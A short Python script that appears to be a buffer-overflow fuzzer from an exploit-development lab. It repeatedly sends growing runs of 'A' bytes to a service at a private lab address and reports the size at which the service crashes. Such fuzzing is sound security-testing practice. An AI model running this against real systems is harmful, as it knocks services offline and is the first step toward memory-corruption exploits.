#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.132.130',1435))
                print("Sending: %s" % str(len(buffer)))
                s.send((buffer + "\x00"))
                #s.send((stack + '\r\n')) new line character \x00--> null byte character
                s.close()
                sleep(4)
                buffer = buffer + "A" * 100

        except:
                print("Crushed at %s bytes" % str(len(buffer)))
                print(buffer)
                sys.exit()
